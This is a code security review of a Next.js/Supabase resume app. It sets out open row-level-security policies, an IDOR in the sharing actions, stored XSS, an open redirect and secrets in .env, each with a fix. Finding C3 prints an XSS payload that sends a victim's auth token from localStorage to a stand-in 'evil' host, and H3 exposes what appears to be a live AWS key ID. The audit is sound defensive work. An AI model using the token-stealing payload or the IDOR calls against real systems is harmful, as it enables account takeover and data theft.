# Security Review: typst-resume

_Date: 2026-07-06_

**Two root causes** drive most of the findings:

1. The `sharingService.ts` **server actions use the service-role key** (which bypasses all Row-Level Security) while trusting the caller's identity from function arguments, with **no authorization checks**. Server actions are directly invokable POST endpoints, so the UI's owner/role gates (all client-side) protect nothing.
2. Two database objects are open to the **`public` role**, and the anon key ships to the browser — so "public" means anyone on the internet.

All findings below were verified by reading the code, not inferred.

---

## Critical (exploitable today)

### C1 — `projects_search` is world-readable and world-writable
`db_setup/4_projects_search.sql:13-14`

```sql
create policy "Enable read access for all users" ... for SELECT to public using (true);
create policy "allow insert" ... for INSERT to public with check (true);
```

Policies grant `public` unconditional `SELECT using(true)` and `INSERT with check(true)`. This table holds the extracted **plaintext of every document/resume**. Anyone unauthenticated can `GET /rest/v1/projects_search?select=chunk` with the public anon key and exfiltrate all document content, and can inject rows (index poisoning / stored HTML in `<mark>` snippets). RLS gives zero isolation here.

**Fix:** scope the SELECT policy to owner/collaborators/CXO via a join to `projects`; restrict INSERT to the service role only.

### C2 — `shareProject` / `unshareProject` privilege escalation (IDOR)
`src/lib/sharingService.ts:55`, `:119`

Service-role actions that never verify the caller owns `projectId`. Calling `shareProject(victimProjectId, myId, myId, 'edit')` directly inserts a share (bypassing the correct `shared_by = auth.uid()` policy), after which the attacker legitimately passes RLS and `canEditProject` to **read and overwrite any document in the org**. `unshareProject` lets anyone revoke anyone's access. The Share button being owner-only (`Toolbar.tsx:152`) is pure UI and irrelevant.

**Fix:** resolve the caller server-side (`auth.getUser()`) and confirm ownership of `projectId` before the privileged write.

### C3 — Stored XSS in the comment popover
`src/components/editor/EditorPane.tsx:520-525`

```ts
popoverContent.innerHTML = `
  <div ...>Line ${comment.start_line}... • ${comment.user_id.slice(0, 8)}</div>
  <div ...>${comment.content}</div>
`;
```

`comment.content` is injected as raw HTML. Comments are cross-user (reviewers/CXOs comment on others' resumes), and posting only requires authentication (`commentService.ts:24`; the Comment button is gated by `canSave`, not edit permission — even read-only viewers can post). An attacker comments `<img src=x onerror="fetch('//evil/?c='+localStorage.getItem('sb-...-auth-token'))">`; when the owner or a CXO opens the doc and clicks the marker, it runs in their session and exfiltrates their Supabase token from `localStorage`. `CommentsSidebar.tsx:66` renders the same content safely as a text node — only this popover is vulnerable.

**Fix:** set `.textContent` for the comment body instead of building it into `innerHTML`.

---

## High

### H1 — `thumbnails` bucket is public; RLS SELECT policy is dead
`db_setup/0_tables_setup.sql:76-77`, `src/lib/thumbnailService.ts`

`public = true` means Supabase serves objects by URL without evaluating RLS, so `"Thumbnails: SELECT Policy"` (`db_setup/2_storage_buckets_policies.sql:109`) does nothing for reads. Thumbnails are rendered PNGs of the actual documents at predictable `userId/projectId/main_thumb.png` paths.

**Fix:** make the bucket private and serve via signed URLs (as `user-projects` does).

### H2 — User-directory & resume enumeration via service-role actions
`src/lib/sharingService.ts:187` (`searchUsers`), `:309` (`getResumeByUsername`), `:139` (`getProjectShares`)

None gate the caller. `searchUsers` runs `admin.listUsers({perPage:1000})` and filters in memory → dumps every user's id/email/name. `getResumeByUsername` maps any guessable username to a resume project ID (the input for C2). `getProjectShares` leaks collaborators' emails for any project.

**Fix:** require an authenticated (and, where implied, CXO/owner) caller in each action.

### H3 — Live secrets in `.env`
Working tree (gitignored, never committed — history is clean).

Contains active Supabase service-role JWT, `DATABASE_URL` password, **AWS key `AKIA6GBMBJI2CJANGQ7O` + secret**, Google OAuth secret, `NEXTAUTH_SECRET`, and a pasted `gh workflow run` with another DB password.

**Fix:** rotate all of these. Delete `NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY` (`.env:12`) — that prefix would inline the service-role key into the browser bundle if ever referenced.

---

## Medium

### M1 — CXO role can delete everyone's data
`db_setup/1_tables_policies.sql:62-79`, `db_setup/2_storage_buckets_policies.sql:92-105`

Any `cxo_users` row gets full `UPDATE`/`DELETE` on all projects and storage. One rogue/compromised CXO wipes everything. Restrict CXOs to `SELECT` if they only review.

### M2 — Open redirect on login
`src/app/login/page.tsx:12-16`

`redirectTo` from the query string is `router.push`'d unvalidated, so `/login?redirectTo=https://evil.com` bounces an authenticated user off-site (phishing).

**Fix:** allow only same-origin paths beginning with a single `/`.

### M3 — `javascript:` link XSS in PDF preview
`src/components/editor/PreviewPane.tsx:204`

Custom `<a>` built from PDF link annotations with `linkElement.href = annotation.url` and no protocol allowlist, bypassing pdf.js sanitization. Typst `#link("javascript:...")` lands here; a click on the link over a shared resume runs script on the app origin.

**Fix:** allowlist `http` / `https` / `mailto` before assigning `href`.

### M4 — Authorization delegated entirely to RLS, with no server-side gate
`src/lib/commentService.ts:9/51`, `src/lib/projectService.ts:198/275`, no `middleware.ts`

`getComments` / `deleteComment` / `fetchUserProjectById` / `loadProjectFile` filter only by the id passed in; route protection is client-side `useEffect` redirects that fire *after* content is fetched. RLS on `projects`, `review_comments`, and the `user-projects` bucket is present and correct, so these are not exploitable today — but they're one policy regression away from being IDORs. Worth a server-side authorization layer regardless.

---

## Low / hardening

- **Read-only collaborators can post comments** — `review_comments` INSERT policy (`db_setup/1_tables_policies.sql:128`) omits the `permission='edit'` check. Confirm intent.
- **Search RPCs trust a client-supplied `curr_user`** instead of `auth.uid()` (`db_setup/4_projects_search.sql:16`, `:147`) — safe only while they stay `SECURITY INVOKER`.
- **`do_not_use_db_policies_setup.sql`** (tracked) has policies that let any authenticated user insert themselves into `cxo_users`. Delete it so it can't be run by mistake.
- **`ProjectList.tsx:136`** — a commented-out `dangerouslySetInnerHTML` over search snippets; latent XSS if re-enabled without sanitizing.
- **No CSP / security headers** in `next.config.ts` — a real CSP would blunt C3 and M3.
- **Misleading `getAdminClient` naming** (`src/lib/supabaseClient.ts:26` returns the *anon* client, variable named `serviceRoleKey`) plus insecure fallbacks — a footgun that invites wiring the real service-role key into the browser.
- **LIKE-wildcard** in `.ilike("title", \`%${q}%\`)` (`src/lib/projectService.ts:129`) — not SQL injection (parameterized), just unescaped `%`/`_`.

---

## Correctly locked down (verified, no action)

- `review_comments` RLS — owner/collaborator/CXO scoping, no authorship spoofing, fail-closed updates.
- Active `cxo_users` policy — no self-escalation via the anon client.
- `user-projects` private bucket — owner-folder + edit-share scoping.
- Anon-client `projectService` / `commentService` paths — RLS enforced under the user's JWT.
- Service-role key confined to `supabaseServer.ts` (`'use server'`) — not bundled to the client.
- CXO "all projects" branch checks `isCXOUser` server-side (genuine, not just UI).

---

## Fix priority

1. **C1** — RLS policy on `projects_search` (worst: exposes all document text to anonymous users).
2. **C3** — one-line change to `.textContent`.
3. **C2 / H2** — add server-side authorization to the `sharingService` actions.
4. **H1** — make the thumbnails bucket private.
5. **M2 / M3** — validate redirect target and link protocols.
